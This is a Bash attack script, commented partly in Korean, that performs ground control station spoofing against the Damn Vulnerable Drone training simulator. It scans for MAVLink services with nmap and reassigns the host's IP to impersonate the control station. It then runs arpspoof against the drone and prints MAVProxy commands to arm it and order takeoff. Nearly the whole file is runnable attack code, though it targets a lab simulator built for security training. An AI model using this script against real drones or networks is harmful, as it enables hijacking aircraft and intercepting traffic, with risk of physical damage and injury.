#!/bin/bash
# gcs_spoofing.sh - Ground Control Station Spoofing Attack for DVD Simulator
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/injection/gcs_spoofing.sh
# Purpose: ARP Spoofing and GCS impersonation attack for Damn Vulnerable Drone simulator

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Ground Control Station Spoofing"
TARGET_NETWORK="192.168.13.0/24"
DOCKER_NETWORK="10.13.0.0/24"
DRONE_IP="192.168.13.14"
GATEWAY_IP="192.168.13.1"
ORIGINAL_GCS_IP="192.168.13.14"
FAKE_GCS_IP="192.168.13.14"
WIFI_INTERFACE="wlan0"

# MAVLink 포트 설정
MAVLINK_PORTS=(14550 14551 14552 5760 5762 5763)

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}    Ground Control Station Spoofing        ${NC}"
    echo -e "${CYAN}       (DVD Simulator Compatible)          ${NC}"
    echo -e "${CYAN}============================================${NC}"
    echo -e "${YELLOW}Target: DVD Ground Control Station${NC}"
    echo -e "${YELLOW}Method: ARP Spoofing + IP Takeover${NC}"
    echo -e "${YELLOW}Impact: Drone Control Hijacking${NC}"
    echo ""
}

check_environment() {
    log_info "Checking DVD environment and prerequisites..."
    
    # 루트 권한 확인
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # 필수 도구 확인
    local required_tools=("arpspoof" "nmap" "nmcli" "ping")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        log_info "Install with: sudo apt-get install dsniff nmap network-manager iputils-ping"
        exit 1
    fi
    
    # DVD 환경 확인
    if is_dvd_environment; then
        log_success "DVD environment detected"
    else
        log_warning "DVD environment not detected, continuing anyway..."
    fi
    
    log_success "Environment check completed"
    return 0
}

discover_dvd_network() {
    log_info "Discovering DVD network and components..."
    
    # DVD 네트워크 스캔
    echo -e "${YELLOW}Scanning for DVD network...${NC}"
    
    local networks=("$TARGET_NETWORK" "$DOCKER_NETWORK")
    local found_network=""
    local found_drone=false
    
    for network in "${networks[@]}"; do
        echo -e "${BLUE}Scanning network: $network${NC}"
        
        local exclude_ips=""
        case "$network" in
            "10.13.0.0/24")
                exclude_ips="--exclude 10.13.0.1,10.13.0.5"
                ;;
            "192.168.13.0/24")
                exclude_ips="--exclude 192.168.13.10"
                ;;
        esac
        
        local active_hosts=$(nmap -sn $network $exclude_ips 2>/dev/null | grep -oP '(?<=Nmap scan report for )[0-9.]+')
        
        if [ -n "$active_hosts" ]; then
            echo -e "${GREEN}Active hosts found in $network:${NC}"
            echo "$active_hosts" | while read -r host; do
                echo "  • $host"
                
                # MAVLink 포트 스캔
                local mavlink_services=$(nmap -sU -p 14550,14551,5760 --open "$host" 2>/dev/null | grep -E "^[0-9]+/udp.*open")
                if [ -n "$mavlink_services" ]; then
                    echo -e "    ${GREEN}🎯 MAVLink services detected:${NC}"
                    echo "$mavlink_services" | sed 's/^/      /'
                    DRONE_IP="$host"
                    found_network="$network"
                    found_drone=true
                fi
            done
        fi
    done
    
    if [ "$found_drone" = true ]; then
        log_success "DVD drone network discovered: $found_network"
        log_success "Drone IP identified: $DRONE_IP"
        
        # 네트워크 설정 업데이트
        if [[ "$found_network" == "10.13.0.0/24" ]]; then
            TARGET_NETWORK="10.13.0.0/24"
            GATEWAY_IP="10.13.0.1"
            FAKE_GCS_IP="10.13.0.10"
            DRONE_IP="10.13.0.6"
        fi
        
        return 0
    else
        log_warning "No DVD drone found with MAVLink services"
        log_info "Using default DVD configuration..."
        return 0
    fi
}

perform_arp_spoofing() {
    log_info "Performing ARP spoofing attack on DVD network..."
    
    # 현재 IP 확인
    local current_ip=$(ip addr show "$WIFI_INTERFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    log_info "Current IP: $current_ip"
    
    # 게이트웨이 확인
    local gateway=$(ip route | grep default | awk '{print $3}' | head -1)
    if [ -n "$gateway" ]; then
        GATEWAY_IP="$gateway"
        log_info "Gateway IP: $GATEWAY_IP"
    fi
    
    # 드론 IP 핑 테스트
    echo -e "${YELLOW}Testing connectivity to DVD drone...${NC}"
    if ping -c 1 -W 2 "$DRONE_IP" >/dev/null 2>&1; then
        log_success "DVD drone is reachable at $DRONE_IP"
    else
        log_warning "DVD drone not responding to ping, continuing anyway..."
    fi
    
    # GCS IP로 정적 IP 설정
    echo -e "${YELLOW}Setting static GCS IP address...${NC}"
    
    # 현재 연결 이름 찾기
    local connection_name=$(nmcli -t -f NAME connection show --active | grep -v lo | head -1)
    
    if [ -z "$connection_name" ]; then
        log_warning "No active connection found, trying default DVD connection names"
        # DVD 환경에서 일반적인 연결 이름들
        for name in "Drone_Wifi" "DVD_Network" "Wired connection 1" "ethernet"; do
            if nmcli connection show "$name" >/dev/null 2>&1; then
                connection_name="$name"
                break
            fi
        done
        
        if [ -z "$connection_name" ]; then
            log_error "Could not find network connection to modify"
            return 1
        fi
    fi
    
    log_info "Using connection: $connection_name"
    
    # 기존 GCS IP 백업 (복원용)
    local backup_ip=$(nmcli connection show "$connection_name" | grep "ipv4.addresses" | awk '{print $2}')
    echo "$backup_ip" > /tmp/original_gcs_ip.txt
    
    # 정적 IP 설정
    log_info "Setting IP to impersonate GCS: $FAKE_GCS_IP"
    nmcli connection modify "$connection_name" ipv4.method manual \
        ipv4.addresses "$FAKE_GCS_IP/24" \
        ipv4.gateway "$GATEWAY_IP" \
        ipv4.dns "8.8.8.8 8.8.4.4" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        log_success "Network configuration updated"
    else
        log_error "Failed to update network configuration"
        return 1
    fi
    
    # 연결 재시작
    echo -e "${YELLOW}Restarting network connection...${NC}"
    nmcli connection down "$connection_name" 2>/dev/null
    sleep 2
    nmcli connection up "$connection_name" 2>/dev/null
    
    sleep 3
    
    # 새 IP 확인
    local new_ip=$(ip addr show "$WIFI_INTERFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    log_success "New IP assigned: $new_ip"
    
    # ARP 스푸핑 시작 (DVD 환경에 맞게)
    echo -e "${YELLOW}Starting ARP spoofing for DVD environment...${NC}"
    echo -e "${RED}Impersonating GCS at $FAKE_GCS_IP${NC}"
    
    # 백그라운드에서 ARP 스푸핑 실행
    arpspoof -i "$WIFI_INTERFACE" -t "$DRONE_IP" -r "$GATEWAY_IP" >/dev/null 2>&1 &
    local arpspoof_pid=$!
    
    echo "$arpspoof_pid" > /tmp/arpspoof.pid
    echo "$connection_name" > /tmp/connection_name.txt
    
    log_success "ARP spoofing started (PID: $arpspoof_pid)"
    
    # ARP 테이블 강제 업데이트
    for i in {1..3}; do
        ping -c 1 "$DRONE_IP" >/dev/null 2>&1
        sleep 1
    done
    
    return 0
}

wait_for_drone_connection() {
    log_info "Waiting for DVD drone connection..."
    
    local max_wait=30
    local wait_count=0
    
    echo -e "${YELLOW}Monitoring for MAVLink traffic from DVD drone...${NC}"
    
    while [ $wait_count -lt $max_wait ]; do
        # MAVLink 포트에서 트래픽 확인
        for port in "${MAVLINK_PORTS[@]}"; do
            if netstat -un 2>/dev/null | grep -q ":$port"; then
                log_success "MAVLink traffic detected on port $port"
                return 0
            fi
        done
        
        # 드론에서 연결 시도 확인
        if ss -tuln 2>/dev/null | grep -q ":14550\|:5760"; then
            log_success "DVD drone attempting to connect"
            return 0
        fi
        
        echo -ne "\rWaiting for DVD drone connection... $((max_wait - wait_count))s "
        sleep 1
        ((wait_count++))
    done
    
    echo ""
    log_warning "No direct drone connection detected within $max_wait seconds"
    log_info "DVD drone may connect later. GCS tools are ready for manual connection."
    
    return 0
}

setup_gcs_tools() {
    log_info "Setting up Ground Control Station tools for DVD..."
    
    echo -e "${BLUE}DVD GCS Control Options:${NC}"
    echo ""
    
    # QGroundControl 설정
    echo -e "${GREEN}1. QGroundControl (Recommended)${NC}"
    echo "   Download and setup:"
    echo "   wget https://s3-us-west-2.amazonaws.com/qgroundcontrol/latest/QGroundControl.AppImage"
    echo "   chmod +x QGroundControl.AppImage"
    echo "   ./QGroundControl.AppImage"
    echo ""
    echo "   DVD Control Commands:"
    echo "   • Right-click on map → 'Go To' position"
    echo "   • Use mode dropdown: 'RTL' or 'Land'"
    echo "   • Manual control via joystick interface"
    echo ""
    
    # MAVProxy 설정
    echo -e "${GREEN}2. MAVProxy (Command Line)${NC}"
    echo "   Installation:"
    echo "   sudo pip install MAVProxy"
    echo ""
    echo "   DVD Control Commands:"
    echo "   mavproxy.py --master=udp:$FAKE_GCS_IP:14550"
    echo "   > mode GUIDED"
    echo "   > arm throttle"
    echo "   > takeoff 10"
    echo "   > rtl"
    echo "   > land"
    echo ""
    
    # 연결 정보
    echo -e "${BLUE}Connection Information:${NC}"
    echo "• Spoofed GCS IP: $FAKE_GCS_IP"
    echo "• Target Drone IP: $DRONE_IP"
    echo "• MAVLink Port: 14550 (primary)"
    echo "• Network: DVD Simulator Environment"
    echo ""
    
    # 성공 지표
    echo -e "${YELLOW}Success Indicators:${NC}"
    echo "• QGroundControl shows 'Connected' status"
    echo "• Telemetry data appears in GCS"
    echo "• Vehicle parameters are accessible"
    echo "• Flight mode changes are successful"
    echo ""
}

restore_network_config() {
    log_info "Restoring original network configuration..."
    
    # ARP 스푸핑 프로세스 종료
    if [ -f "/tmp/arpspoof.pid" ]; then
        local arpspoof_pid=$(cat /tmp/arpspoof.pid)
        if kill -0 "$arpspoof_pid" 2>/dev/null; then
            kill "$arpspoof_pid" 2>/dev/null
            log_success "ARP spoofing process terminated"
        fi
        rm -f /tmp/arpspoof.pid
    fi
    
    # 원래 IP 설정 복원
    if [ -f "/tmp/connection_name.txt" ]; then
        local connection_name=$(cat /tmp/connection_name.txt)
        
        echo -e "${YELLOW}Restoring original IP configuration...${NC}"
        nmcli connection modify "$connection_name" ipv4.method manual \
            ipv4.addresses "192.168.13.10/24" \
            ipv4.gateway "192.168.13.1" \
            ipv4.dns "8.8.8.8 8.8.4.4" 2>/dev/null
        
        # 연결 재시작
        nmcli connection down "$connection_name" 2>/dev/null
        sleep 2
        nmcli connection up "$connection_name" 2>/dev/null
        
        log_success "Network configuration restored"
        rm -f /tmp/connection_name.txt
    fi
    
    # 임시 파일 정리
    rm -f /tmp/original_gcs_ip.txt
    
    log_success "Cleanup completed"
}

execute_gcs_spoofing() {
    log_info "Starting Ground Control Station spoofing attack on DVD"
    
    # 환경 확인
    if ! check_environment; then
        log_error "Environment check failed"
        return 1
    fi
    
    # DVD 네트워크 탐지
    discover_dvd_network
    
    # ARP 스푸핑 실행
    if ! perform_arp_spoofing; then
        log_error "ARP spoofing failed"
        return 1
    fi
    
    # 드론 연결 대기
    wait_for_drone_connection
    
    # GCS 도구 설정 안내
    setup_gcs_tools
    
    echo -e "${BOLD}${GREEN}🎯 GCS Spoofing Attack Ready!${NC}"
    echo -e "${GREEN}You can now control the DVD drone using QGroundControl or MAVProxy${NC}"
    echo ""
    echo -e "${YELLOW}Press Enter to maintain spoofing, or Ctrl+C to stop...${NC}"
    
    # 사용자 입력 대기
    read -r
    
    return 0
}

cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up GCS spoofing attack...${NC}"
    restore_network_config
    exit 0
}

# SIGINT 시그널 처리
trap cleanup SIGINT SIGTERM

# 메인 실행
main() {
    print_attack_banner
    
    # 파라미터 처리
    while [[ $# -gt 0 ]]; do
        case $1 in
            --drone-ip)
                DRONE_IP="$2"
                shift 2
                ;;
            --gateway-ip)
                GATEWAY_IP="$2"
                shift 2
                ;;
            --interface)
                WIFI_INTERFACE="$2"
                shift 2
                ;;
            --help)
                echo "Usage: $0 [OPTIONS]"
                echo "Options:"
                echo "  --drone-ip IP       Target drone IP (default: $DRONE_IP)"
                echo "  --gateway-ip IP     Gateway IP (default: $GATEWAY_IP)"  
                echo "  --interface IFACE   Network interface (default: $WIFI_INTERFACE)"
                echo "  --help              Show this help"
                exit 0
                ;;
            *)
                log_error "Unknown option: $1"
                exit 1
                ;;
        esac
    done
    
    # 공격 실행
    execute_gcs_spoofing
    exit $?
}

# 스크립트가 직접 실행될 때만 main 함수 호출
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi